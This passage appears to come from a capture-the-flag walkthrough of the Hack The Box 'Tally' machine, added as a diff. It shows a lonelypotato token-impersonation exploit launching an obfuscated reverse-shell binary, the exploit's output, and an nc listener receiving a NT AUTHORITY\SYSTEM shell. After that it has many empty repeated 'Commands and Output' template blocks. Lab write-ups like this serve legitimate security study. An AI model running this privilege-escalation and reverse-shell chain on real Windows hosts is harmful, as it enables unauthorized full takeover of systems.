+    Directory: C:\FTP
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----       31/08/2017     23:51                From-Custodian                                                        
+d-----       22/05/2021     10:17                Intranet                                                              
+d-----       28/08/2017     18:56                Logs                                                                  
+d-----       15/09/2017     21:30                To-Upload                                                             
+d-----       17/09/2017     21:27                User                                                                  
+
+
+PS C:\FTP> cd Intranet
+PS C:\FTP\Intranet> dir
+
+
+    Directory: C:\FTP\Intranet
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----       11/09/2017     22:25                Binaries                                                              
+-a----       22/05/2021     10:17        4301882 ebowla-shell-9004.exe                                                 
+-a----       22/05/2021     10:17         334336 lonelypotato.exe
+==================================================================================================================================
+
+Now we can run lonelypotato and get a system shell.
+Commands and Output:
+==================================================================================================================================
+PS C:\FTP\Intranet> C:\FTP\Intranet\lonelypotato.exe * C:\FTP\Intranet\ebowla-shell-9004.exe
+connect sock
+start RPC  connection
+CreateIlok: 0 0
+CreateDoc: 0 0
+COM -> bytes received: 116
+RPC -> bytes Sent: 116
+RPC -> bytes received: 84
+COM -> bytes sent: 84
+COM -> bytes received: 24
+RPC -> bytes Sent: 24
+RPC -> bytes received: 200
+COM -> bytes sent: 200
+COM -> bytes received: 134
+RPC -> bytes Sent: 134
+RPC -> bytes received: 206
+COM -> bytes sent: 206
+COM -> bytes received: 250
+RPC -> bytes Sent: 250
+RPC -> bytes received: 202
+COM -> bytes sent: 202
+COM -> bytes received: 72
+RPC -> bytes Sent: 72
+RPC -> bytes received: 60
+COM -> bytes sent: 60
+COM -> bytes received: 42
+RPC -> bytes Sent: 42
+RPC -> bytes received: 56
+COM -> bytes sent: 56
+CoGet: -2147022986 0
+[+] authresult != -1
+[+] Elevated Token type:2
+Session of Elevated Token: 0
+[+] DuplicateTokenEx :1  0
+[+] Duped Token type:1
+[+] Running C:\FTP\Intranet\ebowla-shell-9004.exe sessionId 1 
+[+] CreateProcessWithTokenW OK
+Auth result: 0
+Return code: 0
+Last error: 0
+..
+..
+..
+┌─[user@parrot-virtual]─[~/htb/tally/www]
+└──╼ $nc -lnvp 9004
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::9004
+Ncat: Listening on 0.0.0.0:9004
+Ncat: Connection from 10.10.10.59.
+Ncat: Connection from 10.10.10.59:51918.
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>
+==================================================================================================================================
+
+EXTRA CONTENT
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
